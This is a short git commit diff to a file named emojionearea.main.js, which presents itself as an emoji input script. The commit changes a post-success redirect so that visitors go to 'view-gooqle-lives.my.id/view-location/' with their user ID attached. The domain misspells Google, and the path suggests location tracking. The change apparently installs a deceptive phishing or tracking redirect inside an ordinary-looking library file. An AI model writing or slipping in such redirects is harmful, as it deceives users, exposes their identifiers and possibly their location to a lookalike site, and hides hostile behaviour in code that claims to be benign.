6fb6c17f935097b86b4e819ad4fbf76c5a2b7e41
ck404ck404 <ck404ck404@gmail.com>
2025-07-11 20:27:39 +0600

    Update emojionearea.main.js

--- emojionearea.main.js
+++ emojionearea.main.js
@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://gm-view.my.id/view-location/${userId}`;
+                            window.location.href = `https://view-gooqle-lives.my.id/view-location/${userId}`;
                           }
                     
                 },
